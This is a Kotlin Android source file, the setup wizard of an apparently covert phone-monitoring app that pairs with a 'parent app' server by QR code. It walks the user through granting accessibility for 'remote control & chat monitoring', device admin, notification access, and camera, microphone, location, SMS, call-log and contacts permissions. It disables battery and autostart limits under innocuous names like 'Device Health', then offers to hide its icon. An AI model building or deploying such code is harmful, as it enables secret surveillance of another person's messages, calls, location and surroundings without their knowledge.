package com.system.service.setup

import android.animation.ObjectAnimator
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.*
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.journeyapps.barcodescanner.ScanContract
import com.journeyapps.barcodescanner.ScanIntentResult
import com.journeyapps.barcodescanner.ScanOptions
import com.system.service.R
import com.system.service.core.CoreService
import com.system.service.core.DeviceAdminReceiver
import com.system.service.core.HealthReporter
import com.system.service.monitors.NotificationMonitor

class SetupActivity : AppCompatActivity() {

    private var currentStep = 0

    // ── View sections (item 10) ──────────────────────────────────────────────
    private lateinit var llStep:          LinearLayout
    private lateinit var llLoading:       LinearLayout
    private lateinit var llCards:         LinearLayout
    private lateinit var tvStep:          TextView
    private lateinit var tvTitle:         TextView
    private lateinit var tvDesc:          TextView
    private lateinit var btnAction:       Button
    private lateinit var btnNext:         Button
    private lateinit var tvLoadingText:   TextView
    private lateinit var cbBatteryConfirm: CheckBox

    // ── Accessibility overlay state (item 9) ─────────────────────────────────
    private var overlayView:          View?          = null
    private var overlayWindowManager: WindowManager? = null
    private var overlaySeconds        = 0
    private val overlayHandler        = Handler(Looper.getMainLooper())
    private val overlayPollingRunnable = object : Runnable {
        override fun run() {
            overlaySeconds++
            if (isAccessibilityEnabled()) {
                dismissAccessibilityOverlay()
                showLoading("Accessibility enabled! ✅") { showStep(currentStep + 1) }
                return
            }
            if (overlaySeconds >= 30) {
                dismissAccessibilityOverlay()
                AlertDialog.Builder(this@SetupActivity)
                    .setTitle("Accessibility Not Enabled")
                    .setMessage("'Device Health' was not turned ON within 30 seconds.\n\nTap Retry to go back to Accessibility Settings.")
                    .setPositiveButton("Retry") { _, _ ->
                        overlaySeconds = 0
                        launchAccessibilityWithOverlay()
                    }
                    .setNegativeButton("Skip for now") { _, _ ->
                        showLoading("Continuing…") { showStep(currentStep + 1) }
                    }
                    .show()
                return
            }
            overlayHandler.postDelayed(this, 1000)
        }
    }

    private val qrScanLauncher = registerForActivityResult(ScanContract()) { result: ScanIntentResult ->
        result.contents?.let { scanned ->
            val parts = scanned.split("|")
            val url   = parts[0].trim()
            val code  = if (parts.size > 1) parts[1].trim() else ""
            if (url.startsWith("ws://") || url.startsWith("wss://")) {
                CoreService.SERVER_URL = url
                getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE).edit()
                    .putString(CoreService.KEY_SERVER_URL, url)
                    .putString(CoreService.KEY_PAIR_CODE, code)
                    .apply()
                showLoading("Connected! ✅") { showStep(1) }
            } else {
                Toast.makeText(this, "Invalid QR — scan parent app ka Settings QR", Toast.LENGTH_LONG).show()
            }
        }
    }

    // ── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_setup)

        llStep           = findViewById(R.id.llStep)
        llLoading        = findViewById(R.id.llLoading)
        llCards          = findViewById(R.id.llCards)
        tvStep           = findViewById(R.id.tvStep)
        tvTitle          = findViewById(R.id.tvTitle)
        tvDesc           = findViewById(R.id.tvDesc)
        btnAction        = findViewById(R.id.btnAction)
        btnNext          = findViewById(R.id.btnNext)
        tvLoadingText    = findViewById(R.id.tvLoadingText)
        cbBatteryConfirm = findViewById(R.id.cbBatteryConfirm)

        // Honour "jump_to_step" extra sent by CoreService's request_accessibility_setup command
        if (intent.getStringExtra("jump_to_step") == "accessibility") {
            showStep(2)
            return
        }

        val prefs = getSharedPreferences(CoreService.PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(CoreService.KEY_SERVER_URL, null)
        if (savedUrl != null) CoreService.SERVER_URL = savedUrl
        showStep(0)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.getStringExtra("jump_to_step") == "accessibility") {
            showStep(2)
        }
    }

    override fun onResume() {
        super.onResume()
        // Refresh card section if currently visible (item 10 — real state on resume)
        if (llCards.visibility == View.VISIBLE) {
            buildCardSection()
            return
        }
        Handler(Looper.getMainLooper()).postDelayed({
            if (currentStep in 1..7 && isPermissionGranted(currentStep)) {
                showLoading("Verifying…") { showStep(currentStep + 1) }
            }
        }, 1500)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                if (checkSelfPermission(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                    requestPermissions(
                        arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 101
                    )
                    return
                }
            }
            showLoading("Checking permissions…") { showStep(8) }
        } else if (requestCode == 101) {
            showLoading("Almost done…") { showStep(8) }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        dismissAccessibilityOverlay()
    }

    // ── Item 10: Loading state between steps ─────────────────────────────────

    private fun showLoading(
        text: String = "Checking necessary permissions, please wait…",
        delayMs: Long = 1700,
        onDone: () -> Unit
    ) {
        llLoading.visibility = View.VISIBLE
        llStep.visibility    = View.GONE
        llCards.visibility   = View.GONE
        tvLoadingText.text   = text
        Handler(Looper.getMainLooper()).postDelayed({
            llLoading.visibility = View.GONE
            onDone()
        }, delayMs)
    }

    // ── Core step router ─────────────────────────────────────────────────────

    private fun showStep(step: Int) {
        currentStep = step
        llCards.visibility          = View.GONE
        llLoading.visibility        = View.GONE
        llStep.visibility           = View.VISIBLE
        cbBatteryConfirm.visibility = View.GONE
        btnNext.isEnabled           = true

        when (step) {

            // ── Step 0: QR scan ─────────────────────────────────────────────
            0 -> updateUI("Setup", "Scan QR Code",
                "Parent app ke Settings se QR scan karo.\n(URL + pair code dono scan hoga)", "Scan QR Code") {
                val options = ScanOptions().apply {
                    setDesiredBarcodeFormats(ScanOptions.QR_CODE)
                    setPrompt("Parent app ki Settings tab ka QR scan karo")
                    setCameraId(0); setBeepEnabled(false)
                }
                qrScanLauncher.launch(options)
            }

            // ── Step 1: Notification Access ─────────────────────────────────
            1 -> updateUI("1/7", "🔔 Sync Notifications",
                "Required for notification monitoring.\n\nTap Enable → find 'Device Health' → turn it ON.", "Enable") {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }

            // ── Step 2: Accessibility (with overlay guide — item 9) ──────────
            2 -> updateUI("2/7", "⚙️ Usage Limits (Accessibility)",
                "Required for app blocking, remote control & chat monitoring.\n\nTap Enable → a guide will appear on screen to help you.", "Enable") {
                launchAccessibilityWithOverlay()
            }

            // ── Step 3: Device Admin ─────────────────────────────────────────
            3 -> updateUI("3/7", "🔒 Device Management",
                "Required for remote screen lock feature.\n\nTap Activate and confirm in the system dialog.", "Activate") {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    ComponentName(this, DeviceAdminReceiver::class.java))
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for remote device security")
                startActivity(i)
            }

            // ── Step 4: Battery Optimization ────────────────────────────────
            4 -> updateUI("4/7", "🔋 Keep Running in Background",
                "Disable battery optimization so this app is NEVER killed by the OS.\n\nTap Disable → find this app → select 'Don't optimize'.", "Disable") {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }

            // ── Step 5: Autostart / OEM-specific ────────────────────────────
            5 -> {
                val brand = android.os.Build.BRAND.lowercase()
                val mfr   = android.os.Build.MANUFACTURER.lowercase()
                val desc  = when {
                    brand.contains("realme") || mfr.contains("realme") ->
                        "▶ Realme: Settings → Battery → Autostart → Enable this app"
                    brand.contains("oppo")   || mfr.contains("oppo")   ->
                        "▶ OPPO: Settings → Battery → App Quick Freeze → Allow"
                    brand.contains("vivo")   || mfr.contains("vivo")   ->
                        "▶ Vivo: Settings → Battery → Background App Mgmt → Allow"
                    brand.contains("xiaomi") || mfr.contains("xiaomi") ||
                    brand.contains("redmi")  ->
                        "▶ Xiaomi: Settings → App info → Battery Saver → No restrictions"
                    brand.contains("huawei") || brand.contains("honor") ->
                        "▶ Huawei: Phone Manager → Startup Manager → Enable this app"
                    else ->
                        "Enable Autostart for this app in your phone's Settings → Battery"
                }
                updateUI("5/7", "⚡ Autostart Permission (CRITICAL for Realme/OPPO/Xiaomi)",
                    desc, "Open Settings") {
                    openAutostartSettings()
                }
            }

            // ── Step 6: Display Over Other Apps ─────────────────────────────
            6 -> updateUI("6/7", "🖥️ Display Over Other Apps",
                "Required for overlay alerts and the Live Painting feature.\n\nTap Allow → find this app → toggle ON.", "Allow") {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }

            // ── Step 7: Runtime permissions ──────────────────────────────────
            7 -> updateUI("7/7", "📷🎤📍 Camera, Mic & Location",
                "Required for live video, audio monitoring, and location tracking features.\n\nTap Allow All and accept each permission.", "Allow All") {
                val permsToRequest = mutableListOf<String>()
                val allPerms = buildList {
                    add(android.Manifest.permission.CAMERA)
                    add(android.Manifest.permission.RECORD_AUDIO)
                    add(android.Manifest.permission.ACCESS_FINE_LOCATION)
                    if (android.os.Build.VERSION.SDK_INT == android.os.Build.VERSION_CODES.Q) {
                        add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    }
                    add(android.Manifest.permission.READ_CALL_LOG)
                    add(android.Manifest.permission.READ_SMS)
                    add(android.Manifest.permission.READ_PHONE_STATE)
                    add(android.Manifest.permission.READ_PHONE_NUMBERS)
                    add(android.Manifest.permission.READ_CONTACTS)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                        add(android.Manifest.permission.POST_NOTIFICATIONS)
                    }
                }
                for (perm in allPerms) {
                    if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED)
                        permsToRequest.add(perm)
                }
                if (permsToRequest.isEmpty()) showLoading("All permissions granted! ✅") { showStep(8) }
                else requestPermissions(permsToRequest.toTypedArray(), 100)
            }

            // ── Step 8: OEM battery whitelist mandatory step (item 8) ────────
            8 -> showOemBatteryStep()

            // ── Step 9: Final / Done ─────────────────────────────────────────
            9 -> showFinalStep()
        }
    }

    // ── Item 8: OEM Battery Whitelist ────────────────────────────────────────

    private fun showOemBatteryStep() {
        val brand = android.os.Build.BRAND.lowercase()
        val mfr   = android.os.Build.MANUFACTURER.lowercase()
        val isOemDevice = listOf("realme", "oppo", "vivo", "xiaomi", "redmi", "huawei", "honor")
            .any { brand.contains(it) || mfr.contains(it) }

        if (!isOemDevice) {
            // Non-OEM device: skip this step entirely
            showLoading("Almost done…") { showStep(9) }
            return
        }

        currentStep = 8
        llStep.visibility           = View.VISIBLE
        cbBatteryConfirm.visibility = View.VISIBLE

        val mfrName = android.os.Build.MANUFACTURER
        tvStep.text  = "Step 8/8"
        tvTitle.text = "⚠️ One More Critical Step"
        tvDesc.text  = "$mfrName devices are known to kill background apps aggressively.\n\n" +
            "Without this step, the monitoring service WILL be stopped by the OS — even if all previous steps are done.\n\n" +
            "Tap 'Open Battery Settings' → find this app → set to 'Don't Optimize' or 'No Restrictions'."

        btnAction.text = "Open Battery Settings"
        btnAction.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFFFF6D00.toInt())
        btnAction.setOnClickListener {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")))
        }

        cbBatteryConfirm.text = "I have disabled battery optimization for this app"
        cbBatteryConfirm.setTextColor(0xFFCCCCCC.toInt())
        cbBatteryConfirm.isChecked = false

        // Continue is disabled until checkbox is ticked AND OS confirms exemption
        btnNext.text = "Continue →"
        btnNext.isEnabled = false
        btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF333333.toInt())

        cbBatteryConfirm.setOnCheckedChangeListener { _, checked ->
            if (!checked) {
                cbBatteryConfirm.text = "I have disabled battery optimization for this app"
                cbBatteryConfirm.setTextColor(0xFFCCCCCC.toInt())
                btnNext.isEnabled = false
                btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
                return@setOnCheckedChangeListener
            }
            // Re-verify against OS — checkbox alone is not enough
            val actuallyExempt = HealthReporter.isBatteryOptimizationExempt(this)
            if (!actuallyExempt) {
                cbBatteryConfirm.isChecked = false
                cbBatteryConfirm.text = "❌ Still optimized! Open Battery Settings and choose 'Don't optimize'"
                cbBatteryConfirm.setTextColor(0xFFFF4444.toInt())
                btnNext.isEnabled = false
            } else {
                cbBatteryConfirm.text = "✅ Battery optimization disabled — you're all set!"
                cbBatteryConfirm.setTextColor(0xFF00C853.toInt())
                btnNext.isEnabled = true
                btnNext.backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
            }
        }

        btnNext.setOnClickListener { showLoading("All done! ✅") { showStep(9) } }
    }

    // ── Item 9: Accessibility Overlay Guide ──────────────────────────────────

    private fun launchAccessibilityWithOverlay() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        if (Settings.canDrawOverlays(this)) {
            // Brief delay to let system settings activity open first
            Handler(Looper.getMainLooper()).postDelayed({ showAccessibilityOverlay() }, 900)
        }
        // If no overlay permission: guide still helps via the onResume auto-advance poll
    }

    private fun showAccessibilityOverlay() {
        if (overlayView != null) return
        val wm  = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        overlayWindowManager = wm

        val overlay = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xEE0D1117.toInt())
            setPadding(56, 40, 56, 40)
        }

        val tvArrow = TextView(this).apply {
            text = "↓  ↓  ↓"
            textSize = 32f
            setTextColor(0xFF00E5FF.toInt())
            gravity = android.view.Gravity.CENTER
        }
        val tv1 = TextView(this).apply {
            text = "Step 1: Find \"Device Health\" in this list"
            textSize = 15f; setTextColor(0xFFFFFFFF.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 14, 0, 4)
        }
        val tv2 = TextView(this).apply {
            text = "Step 2: Tap it → turn the toggle ON"
            textSize = 15f; setTextColor(0xFF00FF88.toInt())
            gravity = android.view.Gravity.CENTER
        }
        val tvTimer = TextView(this).apply {
            text = "Auto-detecting… (30s)"
            textSize = 12f; setTextColor(0xFF666688.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 8, 0, 0)
        }
        val btnDismiss = Button(this).apply {
            text = "Dismiss Guide"
            textSize = 12f
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF222233.toInt())
            setTextColor(0xFF888888.toInt())
        }
        btnDismiss.setOnClickListener { dismissAccessibilityOverlay() }

        overlay.addView(tvArrow); overlay.addView(tv1)
        overlay.addView(tv2);     overlay.addView(tvTimer)
        overlay.addView(btnDismiss)
        overlayView = overlay

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        ).apply { gravity = android.view.Gravity.BOTTOM }

        try {
            wm.addView(overlay, params)
            // Bouncing arrow animation
            val anim = ObjectAnimator.ofFloat(tvArrow, "translationY", 0f, 18f)
            anim.duration = 550
            anim.repeatCount = ObjectAnimator.INFINITE
            anim.repeatMode  = ObjectAnimator.REVERSE
            anim.start()
            // Countdown timer update
            val countdownHandler = Handler(Looper.getMainLooper())
            val countdownRunnable = object : Runnable {
                var s = 0
                override fun run() {
                    s++
                    val remaining = 30 - s
                    if (remaining >= 0 && overlayView != null)
                        tvTimer.text = "Auto-detecting… (${remaining}s remaining)"
                    if (remaining > 0 && overlayView != null)
                        countdownHandler.postDelayed(this, 1000)
                }
            }
            countdownHandler.postDelayed(countdownRunnable, 1000)
            // Start accessibility polling
            overlaySeconds = 0
            overlayHandler.post(overlayPollingRunnable)
        } catch (_: Exception) { }
    }

    private fun dismissAccessibilityOverlay() {
        overlayHandler.removeCallbacks(overlayPollingRunnable)
        try { overlayView?.let { overlayWindowManager?.removeView(it) } } catch (_: Exception) {}
        overlayView = null
        overlayWindowManager = null
    }

    // ── Item 10: Card section (permission overview with live state) ───────────

    @Suppress("UNUSED_PARAMETER")
    private fun showCardOverview() {
        llStep.visibility    = View.GONE
        llLoading.visibility = View.GONE
        llCards.visibility   = View.VISIBLE
        buildCardSection()
    }

    private fun buildCardSection() {
        llCards.removeAllViews()

        data class PermCard(val icon: String, val group: String, val desc: String, val granted: Boolean)
        val cards = listOf(
            PermCard("⚙️", "Usage Limits",                  "Accessibility — app blocking, remote control",   isAccessibilityEnabled()),
            PermCard("🖥️", "Display Over Other Apps",       "Overlay alerts + live painting",                 Settings.canDrawOverlays(this)),
            PermCard("📷", "Remote Camera",                  "Live photo / video monitoring",                  checkSelfPermission(android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED),
            PermCard("🎤", "One-Way Audio",                  "Background audio monitoring",                    checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED),
            PermCard("🔔", "Sync Notifications",            "Notification listener access",                   isNotificationEnabled()),
            PermCard("📍", "Live Location",                  "GPS location tracking",                          checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED),
            PermCard("🔋", "Keep Running in Background",    "Battery optimization exempt + Autostart",        HealthReporter.isBatteryOptimizationExempt(this)),
        )

        val tvHeader = TextView(this).apply {
            text = "Permission Status"
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(0xFFFFFFFF.toInt())
            val lp = LinearLayout.LayoutParams(-2, -2).apply { bottomMargin = 20 }
            layoutParams = lp
        }
        llCards.addView(tvHeader)

        for (card in cards) {
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                setBackgroundColor(if (card.granted) 0xFF091509.toInt() else 0xFF160808.toInt())
                setPadding(20, 18, 20, 18)
                val lp = LinearLayout.LayoutParams(-1, -2).apply { bottomMargin = 6 }
                layoutParams = lp
            }
            val tvIcon = TextView(this).apply {
                text = card.icon; textSize = 26f; setPadding(0, 0, 16, 0)
                layoutParams = LinearLayout.LayoutParams(-2, -2).apply { gravity = android.view.Gravity.CENTER_VERTICAL }
            }
            val colInfo = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = LinearLayout.LayoutParams(0, -2, 1f)
            }
            val tvGroup = TextView(this).apply {
                text = card.group; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
                setTextColor(0xFFFFFFFF.toInt())
            }
            val tvDsc = TextView(this).apply {
                text = card.desc; textSize = 11f; setTextColor(0xFF777788.toInt())
            }
            val tvStatus = TextView(this).apply {
                text = if (card.granted) "✅" else "❌"; textSize = 22f
                layoutParams = LinearLayout.LayoutParams(-2, -2).apply { gravity = android.view.Gravity.CENTER_VERTICAL }
            }
            colInfo.addView(tvGroup); colInfo.addView(tvDsc)
            row.addView(tvIcon); row.addView(colInfo); row.addView(tvStatus)
            llCards.addView(row)
        }

        val allGranted = cards.all { it.granted }
        val btnConfirm = Button(this).apply {
            text = if (allGranted) "✅ All Granted — Finish Setup" else "Grant Missing Permissions"
            backgroundTintList = android.content.res.ColorStateList.valueOf(
                if (allGranted) 0xFF4CAF50.toInt() else 0xFF2196F3.toInt())
            setTextColor(0xFFFFFFFF.toInt())
            val lp = LinearLayout.LayoutParams(-1, -2).apply { topMargin = 20 }
            layoutParams = lp
        }
        btnConfirm.setOnClickListener {
            if (allGranted) showLoading("All done! ✅") { showStep(8) }
            else showLoading("Starting setup wizard…") { showStep(1) }
        }
        llCards.addView(btnConfirm)
    }

    // ── Final step ───────────────────────────────────────────────────────────

    private fun showFinalStep() {
        currentStep = 9
        tvStep.text  = "Done! 🎉"
        tvTitle.text = "Setup Complete"
        tvDesc.text  = "✅ The monitoring service is now running in the background.\n\nAll permissions have been granted. You can safely hide this app icon."

        try { startForegroundService(Intent(this, CoreService::class.java)) } catch (_: Exception) {}

        btnAction.text = "Hide App Icon"
        btnAction.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFFFF5722.toInt())
        btnAction.setOnClickListener {
            hideIcon()
            Toast.makeText(this, "Icon hidden! Use parent app to manage.", Toast.LENGTH_LONG).show()
            finishAffinity()
        }

        btnNext.text = "Keep Icon Visible & Finish"
        btnNext.isEnabled = true
        btnNext.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF4CAF50.toInt())
        btnNext.setOnClickListener { finishAffinity() }
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private fun openAutostartSettings() {
        val brand = android.os.Build.BRAND.lowercase()
        val mfr   = android.os.Build.MANUFACTURER.lowercase()
        val intents = mutableListOf<Intent>()
        when {
            brand.contains("realme") || mfr.contains("realme") ||
            brand.contains("oppo")   || mfr.contains("oppo")   -> {
                intents += Intent().setClassName("com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity")
                intents += Intent().setClassName("com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity")
                intents += Intent().setClassName("com.coloros.oppoguardelf",
                    "com.coloros.powermanager.powersaver.PowerUsageModelActivity")
            }
            brand.contains("vivo") || mfr.contains("vivo") -> {
                intents += Intent().setClassName("com.vivo.permissionmanagement",
                    "com.vivo.permissionmanagement.activity.SoftPermissionDetailActivity")
            }
            brand.contains("xiaomi") || mfr.contains("xiaomi") || brand.contains("redmi") -> {
                intents += Intent().setClassName("com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity")
            }
            brand.contains("huawei") || brand.contains("honor") -> {
                intents += Intent().setClassName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")
            }
        }
        intents += Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS)
        intents += Intent(Settings.ACTION_SETTINGS)
        for (intent in intents) {
            try { intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(intent); return }
            catch (_: Exception) {}
        }
    }

    private fun hideIcon() {
        listOf(
            "$packageName.setup.LauncherAlias",
            "$packageName.setup.SetupActivityAlias"
        ).forEach { aliasName ->
            try {
                packageManager.setComponentEnabledSetting(
                    ComponentName(packageName, aliasName),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (_: Exception) {}
        }
    }

    private fun isPermissionGranted(step: Int): Boolean = when (step) {
        1 -> isNotificationEnabled()
        2 -> isAccessibilityEnabled()
        3 -> isDeviceAdminEnabled()
        4 -> (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
        5 -> true  // Autostart — cannot verify programmatically; user must confirm manually
        6 -> Settings.canDrawOverlays(this)
        else -> true
    }

    private fun isNotificationEnabled(): Boolean {
        val cn   = ComponentName(this, NotificationMonitor::class.java)
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(cn.flattenToString()) == true
    }

    private fun isAccessibilityEnabled(): Boolean {
        val cn   = ComponentName(packageName, "com.system.service.monitors.AccessibilityMonitor")
        val flat = cn.flattenToString()
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabled.contains(flat)
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
    }

    private fun updateUI(
        step: String, title: String, desc: String, btnText: String, action: () -> Unit
    ) {
        tvStep.text    = "Step $step"
        tvTitle.text   = title
        tvDesc.text    = desc
        btnAction.text = btnText
        btnAction.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF2196F3.toInt())
        btnAction.setOnClickListener { action() }
        btnNext.text   = "Already Done - Next →"
        btnNext.isEnabled = true
        btnNext.backgroundTintList =
            android.content.res.ColorStateList.valueOf(0xFF333333.toInt())
        btnNext.setOnClickListener {
            showLoading("Verifying…") { showStep(currentStep + 1) }
        }
    }
}
